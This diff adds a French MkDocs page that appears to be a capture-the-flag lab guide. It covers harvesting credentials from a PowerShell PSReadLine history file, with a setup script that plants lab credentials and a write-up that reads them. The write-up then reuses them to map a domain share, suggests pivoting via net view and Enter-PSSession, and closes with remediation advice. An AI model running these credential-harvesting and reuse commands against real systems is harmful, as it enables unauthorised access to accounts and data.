@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 4 — Historique PowerShell avec credentials - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 4 \u2014 Historique PowerShell avec credentials";
+        var mkdocs_page_input_path = "windows/Flag4-Historique-PS.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 4 — Historique PowerShell avec credentials</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="flag-4-historique-powershell-avec-credentials">Flag 4 — Historique PowerShell avec credentials</h1>
+<blockquote>
+<p><strong>Technique :</strong> Credential Harvesting via PSReadLine History
+<strong>Machine de déploiement :</strong> WS01
+<strong>Machine d'exploitation :</strong> WS01
+<strong>Compte de départ :</strong> <code>CTF\lowpriv</code> / <code>User@1234</code>
+<strong>Difficulté :</strong> Facile</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="prerequis">Prérequis</h3>
+<blockquote>
+<p>[!warning] Action manuelle AVANT le script
+Se connecter <strong>une fois</strong> sur WS01 avec <code>CTF\lowpriv</code> / <code>User@1234</code> pour que Windows crée le profil utilisateur complet. Ouvrir PowerShell, taper une commande quelconque, puis se déconnecter. Revenir sur la session Administrator avant de lancer le script.</p>
+</blockquote>
+<h3 id="script-flag4-historique-psps1">Script — Flag4-Historique-PS.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur WS01</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+
+Write-Host &quot;`n[FLAG 4] Historique PowerShell avec credentials&quot; -ForegroundColor Cyan
+
+# Verifier que le profil lowpriv existe
+if (-not (Test-Path &quot;C:\Users\lowpriv&quot;)) {
+    Write-Host &quot;  [!] ERREUR : profil lowpriv inexistant.&quot; -ForegroundColor Red
+    Write-Host &quot;  [!] Connecte-toi une fois avec CTF\lowpriv, puis relance ce script.&quot; -ForegroundColor Red
+    exit 1
+}
+
+$histDir  = &quot;C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&quot;
+$histFile = &quot;$histDir\ConsoleHost_history.txt&quot;
+New-Item -ItemType Directory -Path $histDir -Force | Out-Null
+
+# Historique realiste avec credentials en clair
+@&quot;
+whoami
+hostname
+ipconfig /all
+net user /domain
+Get-ADUser -Filter * | Select Name, SamAccountName
+cd C:\Users\lowpriv\Documents
+ls
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+Get-Service | Where-Object Status -eq Running
+net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+dir Z:\
+net use Z: /delete
+Get-EventLog -LogName System -Newest 20
+&quot;@ | Set-Content -Path $histFile -Encoding UTF8
+Write-Host &quot;  [+] Historique injecte : $histFile&quot; -ForegroundColor Green
+
+# Permissions : SYSTEM + Admins (FullControl), lowpriv (Read uniquement)
+$acl = Get-Acl $histDir
+$acl.SetAccessRuleProtection($true, $false)
+$acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
+foreach ($sid in @(&quot;S-1-5-18&quot;, &quot;S-1-5-32-544&quot;)) {
+    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $s, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+}
+$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+    &quot;CTF\lowpriv&quot;, &quot;ReadAndExecute&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+Set-Acl -Path $histDir -AclObject $acl
+Write-Host &quot;  [+] Permissions : lecture seule pour lowpriv&quot; -ForegroundColor Green
+
+# Verifications
+Write-Host &quot;`n  [*] Verification du fichier :&quot; -ForegroundColor Yellow
+Test-Path $histFile
+Write-Host &quot;`n  [*] Permissions :&quot; -ForegroundColor Yellow
+icacls $histFile
+
+Write-Host &quot;`n[FLAG 4] DONE&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT : WS01 - Flag4 deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="verification-du-deploiement">Vérification du déploiement</h3>
+<blockquote>
+<p>[!warning] Depuis PowerShell Admin sur WS01</p>
+</blockquote>
+<pre><code class="language-powershell"># Verifier que le fichier existe
+Test-Path &quot;C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;
+# Attendu : True
+
+# Verifier le contenu (en admin)
+Get-Content &quot;C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;
+# Attendu : ligne contenant &quot;net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99&quot;
+</code></pre>
+<blockquote>
+<p>[!success] Snapshot WS01
+<strong><code>WS01 — Flag4 déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up">Write-up</h2>
+<h3 id="contexte">Contexte</h3>
+<p>PSReadLine est un module PowerShell qui améliore l'expérience en ligne de commande. Il sauvegarde automatiquement toutes les commandes tapées dans un fichier texte persistant entre les sessions : <code>ConsoleHost_history.txt</code>. Ce fichier n'est pas géré par les cmdlets d'historique classiques (<code>Get-History</code>) et est souvent oublié par les administrateurs. Il peut contenir des credentials passés directement en argument de commande.</p>
+<hr />
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="etape-1-trouver-le-fichier-dhistorique">Étape 1 — Trouver le fichier d'historique</h4>
+<p>Connecté en <code>CTF\lowpriv</code> sur WS01, ouvrir PowerShell :</p>
+<pre><code class="language-powershell"># Chemin standard du fichier d'historique PSReadLine
+$histPath = &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;
+Test-Path $histPath
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>True
+</code></pre>
+<p>Le fichier existe.</p>
+<h4 id="etape-2-lire-le-fichier">Étape 2 — Lire le fichier</h4>
+<pre><code class="language-powershell">Get-Content &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code class="language-powershell">whoami
+hostname
+ipconfig /all
+net user /domain
+Get-ADUser -Filter * | Select Name, SamAccountName
+cd C:\Users\lowpriv\Documents
+ls
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+Get-Service | Where-Object Status -eq Running
+net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+dir Z:\
+net use Z: /delete
+Get-EventLog -LogName System -Newest 20
+</code></pre>
+<p>On repère immédiatement la ligne :</p>
+<pre><code>net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+</code></pre>
+<p>Les credentials du compte <code>svc-backup</code> sont exposés en clair : <code>Backup@Secure99</code>.</p>
+<hr />
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="etape-3-utiliser-les-credentials-pour-acceder-au-share">Étape 3 — Utiliser les credentials pour accéder au share</h4>
+<pre><code class="language-powershell">net use B: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>La commande s'est terminée correctement.
+</code></pre>
+<h4 id="etape-4-lister-le-contenu-du-share">Étape 4 — Lister le contenu du share</h4>
+<pre><code class="language-powershell">dir B:\
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Répertoire : B:\
+
+Mode    LastWriteTime  Name
+----    -------------  ----
+-a----               flag3.txt
+</code></pre>
+<h4 id="etape-5-lire-le-flag">Étape 5 — Lire le flag</h4>
+<pre><code class="language-powershell">Get-Content B:\flag3.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{ad_acl_delegation_abuse}
+</code></pre>
+<pre><code class="language-powershell"># Nettoyer le lecteur mappé
+net use B: /delete
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag">Récupération du flag</h3>
+<pre><code class="language-powershell">Get-Content B:\flag3.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{ad_acl_delegation_abuse}
+</code></pre>
+<blockquote>
+<p>[!note]
+Le Flag 4 et le Flag 3 mènent au même share <code>\\DC01\Backups</code>. Deux chemins différents pour le même résultat : l'un via les ACL AD, l'autre via les credentials exposés dans l'historique.</p>
+</blockquote>
+<hr />
+<h3 id="aller-plus-loin">Aller plus loin</h3>
+<p>Avec le compte <code>svc-backup</code>, on peut aussi pivoter vers d'autres ressources auxquelles ce compte a accès sur le réseau :</p>
+<pre><code class="language-powershell"># Tester l'acces a d'autres shares
+net use \\DC01 /user:CTF\svc-backup Backup@Secure99
+net view \\DC01
+
+# Tenter une connexion RDP ou PSRemoting
+Enter-PSSession -ComputerName DC01 -Credential (Get-Credential)
+# CTF\svc-backup / Backup@Secure99
+</code></pre>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credentials passés en argument CLI</td>
+<td>Ne jamais passer de mots de passe en argument — utiliser <code>Get-Credential</code> ou des secrets managés</td>
+</tr>
+<tr>
+<td>Historique PSReadLine non géré</td>
+<td>Vider régulièrement l'historique : <code>Clear-History</code> + supprimer <code>ConsoleHost_history.txt</code></td>
+</tr>
+<tr>
+<td>Désactiver la persistance</td>
+<td><code>Set-PSReadLineOption -HistorySaveStyle SaveNothing</code> dans le profil PowerShell</td>
+</tr>
+<tr>
+<td>Pas de rotation des credentials</td>
+<td>Mettre en place une rotation régulière des mots de passe de comptes de service</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>lowpriv
+  └─→ $env:APPDATA\...\PSReadLine\ConsoleHost_history.txt
+        └─→ &quot;net use ... /user:CTF\svc-backup Backup@Secure99&quot;
+              └─→ credentials svc-backup en clair
+                    └─→ net use \\DC01\Backups /user:svc-backup Backup@Secure99
+                          └─→ FLAG{ad_acl_delegation_abuse}
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
